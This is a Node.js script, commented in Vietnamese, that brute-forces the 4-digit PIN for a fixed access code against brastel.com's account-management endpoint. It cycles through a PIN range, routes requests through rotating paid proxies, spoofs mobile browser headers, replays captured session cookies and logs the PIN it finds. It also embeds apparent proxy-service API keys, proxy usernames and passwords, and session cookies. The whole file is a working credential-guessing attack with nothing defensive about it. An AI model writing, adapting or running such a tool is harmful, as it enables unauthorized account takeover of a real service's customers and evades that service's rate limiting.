// multi_worker_proxy.js

const axios = require('axios');
const qs = require('qs');
const fs = require('fs');
const { HttpsProxyAgent } = require('https-proxy-agent');
const util = require('util');

// ⚙️ Cấu hình chung
const accessCode = '74974423';
const pinStart = 5410;
const pinEnd = 5420;
const concurrentWorkers = 1; // Tùy chỉnh số luồng
const maxRetries = 5;
const retryDelay = 3000;

const apiKeys = [
  '3cd48e7a11795c8b662ca62d8a3c0fc6',
  'b89da3d6a68ae3b7bf7560e500745110',
  '1e7b67f00e49eef4b8b9a70cb9abb428',
  '61f9c250aa5f8fe1735aa828499cd1db',
  '06daa5cb46a0051b288398749309d8fe',
];



const fullProxy = [
  '',
  'http://tmproxyJarOo:ktjVP8tKcY@171.246.71.58:14053',
  'http://tmproxyHtCJ7:XW9mBa5aGu@117.6.57.157:15485',
  'http://tmproxypmH7n:nPbgwdCGV7@116.106.181.14:6281',
];


const cookies = [
'_gid=GA1.2.1017418017.1750076505; brastel_selected_loc=jp; signInLangTrackEvent=50249645300514; preferredLang=eng; _ga=GA1.2.1940379617.1750076505; _ga_30ZHYZDBG0=GS2.1.s1750111962$o4$g1$t1750112488$j60$l0$h0; ASP.NET_SessionId=oa4wxi41a20x5h4twgawrmi5; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8AD22EB5161F2C7AB3014A70051CE4FA37FD4E580278805751D3836308F6F276B; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8AD22EB5161F2C7AB3014A70051CE4FA37FD4E580278805751D3836308F6F276B; _gat=1',
'_gid=GA1.2.422809412.1750083209; _ga=GA1.1.1045990569.1750083209; ASP.NET_SessionId=3dzst35hihzudwwj44y3f3th; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8AD22EB5161F2C7AB3014A70051CE4FA37FD4E580278805751D3836308F6F276B; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8AD22EB5161F2C7AB3014A70051CE4FA37FD4E580278805751D3836308F6F276B; _ga_30ZHYZDBG0=GS2.1.s1750093512$o3$g0$t1750093512$j60$l0$h0; preferredLang=eng',
'_gid=GA1.2.1943019296.1750083617; _ga=GA1.1.1156634628.1750083617; preferredLang=eng; ASP.NET_SessionId=yqoeb4pytthxjrbu3als3eax; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8AD22EB5161F2C7AB3014A70051CE4FA37FD4E580278805751D3836308F6F276B; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9630A4EB55147521A4CC93077CC30C2F8AD22EB5161F2C7AB3014A70051CE4FA37FD4E580278805751D3836308F6F276B; _ga_30ZHYZDBG0=GS2.1.s1750091439$o2$g1$t1750093605$j55$l0$h0; invalidPIN=1',
'ASP.NET_SessionId=mzddfr1xhrbs0koon5jtmbn0; AWSELB=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002ED0CDD21FDE9E146F00EB73527DB00B99D6AA5C0E88A842A861D33DC4EA44715; AWSELBCORS=1BB79F7B04C9CBC0EF6C78B167088EAC4E335C02F9F2459D1D823108D586FB065E7B5F9002ED0CDD21FDE9E146F00EB73527DB00B99D6AA5C0E88A842A861D33DC4EA44715; _gid=GA1.2.605414654.1750093761; _gat=1; preferredLang=eng; _ga=GA1.1.852219304.1750093761; _ga_30ZHYZDBG0=GS2.1.s1750093764$o1$g1$t1750093772$j52$l0$h0',
];

let found = false;
const logFile = `log_${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;

function log(message) {
  const timestamp = new Date().toISOString();
  const fullMessage = `[${timestamp}] ${message}`;
  console.log(fullMessage);
  fs.appendFileSync(logFile, fullMessage + '\n');
}

async function getProxy(apiKey) {
  while (true) {
    try {
      const res = await axios.post('https://tmproxy.com/api/proxy/get-new-proxy', {
        api_key: apiKey,
        id_location: 0,
        id_isp: 0
      });

      if (res.data.code === 0 && res.data.data.https) {

        const data = res.data.data;
        const [host, port] = data.https.split(':');
        const proxyUrl = `http://${data.username}:${data.password}@${host}:${port}`;
        const agent = new HttpsProxyAgent(proxyUrl);
        log(`🛡️ Proxy mới từ ${apiKey}: ${proxyUrl}`);
        return { agent, lastRotate: Date.now() };
      } else {
        log(`❌ Lỗi xoay proxy với ${apiKey}: ${JSON.stringify(res.data)}`);
        await new Promise(r => setTimeout(r, 30000));
      }
    } catch (err) {
      log(`❌ Lỗi kết nối khi xoay proxy ${apiKey}: ${err.message}`);
      await new Promise(r => setTimeout(r, 30000));
    }
  }
}

async function checkPin(pin, agent, apiKey, id, cookie) {
  const url = 'https://www.brastel.com/web/WIMS/Manager.aspx';
  const headers = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://www.brastel.com/myaccount/m/password/eng',
    'Origin': 'https://www.brastel.com',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Cookie': cookie
  };

  const data = {
    xslFile: 'ajax_sip_050_activation.xsl',
    action: 'ReturnSPCNumber',
    accessCode,
    style: '14',
    service: '1',
    pin: pin.toString()
  };

  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    if (found) return;
    try {
      let response;
      if (agent) {
        response = await axios.post(url, qs.stringify(data), {
          headers,
          httpsAgent: agent,
          proxy: false,
          timeout: 60000
        });
      } else {
        response = await axios.post(url, qs.stringify(data), {
          headers,
          proxy: false,
          timeout: 60000
        });
      }
      const res = response.data;
      // log(`🔍 PIN: ${pin} | Response: ${util.inspect(response, { depth: null, colors: true })}`);
      log(`🔍 Worker ${id} - PIN: ${pin} | Status: ${response.status} | Result: ${res.result} - ${res.errorMsg}`);
      if (res.result === undefined) {
        log(`⚠️ Worker ${id} - Lỗi khi kiểm tra PIN ${pin}`);
        await new Promise(r => setTimeout(r, retryDelay));
      } else {
        if (res.result === '0') {
          log(`✅ Worker ${id} - TÌM THẤY PIN: ${pin} (${data.accessCode})`);
          found = true;
        }
        return;
      }
    } catch (err) {
      log(`⚠️ Worker ${id} - Lỗi khi kiểm tra PIN ${pin} (lần ${attempt}): ${err.message}`);
      if (attempt < maxRetries) await new Promise(r => setTimeout(r, retryDelay));
    }
  }
}

async function worker(id, pins, apiKey, cookie, proxy) {
  // let { agent, lastRotate } = await getProxy(apiKey);
  for (const pin of pins) {
    if (found) return;
    // if (Date.now() - lastRotate > 250000) {
    //   log(`🔄 Worker ${id}: Đã quá 250 giây, xoay proxy mới...`);
    //   ({ agent, lastRotate } = await getProxy(apiKey));
    // }
    // await checkPin(('0000' + pin).slice(-4), agent, apiKey, id, cookie);

    let agent;
    if (proxy) {
      agent = new HttpsProxyAgent(proxy);
    }
    await checkPin(('0000' + pin).slice(-4), agent, apiKey, id, cookie);
  }
}

async function main() {
  const pins = [];
  for (let i = pinStart; i <= pinEnd; i++) pins.push(i);

  const batchSize = Math.ceil(pins.length / concurrentWorkers);
  const workers = [];

  for (let i = 0; i < concurrentWorkers; i++) {
    const start = i * batchSize;
    const end = Math.min((i + 1) * batchSize, pins.length);
    const pinSlice = pins.slice(start, end);
    const apiKey = apiKeys[i];
    const cookie = cookies[i];
    const proxy = fullProxy[i];
    workers.push(worker(i + 1, pinSlice, apiKey, cookie, proxy));
  }

  await Promise.all(workers);
  log('🎯 Hoàn tất tất cả tác vụ.');
}

main();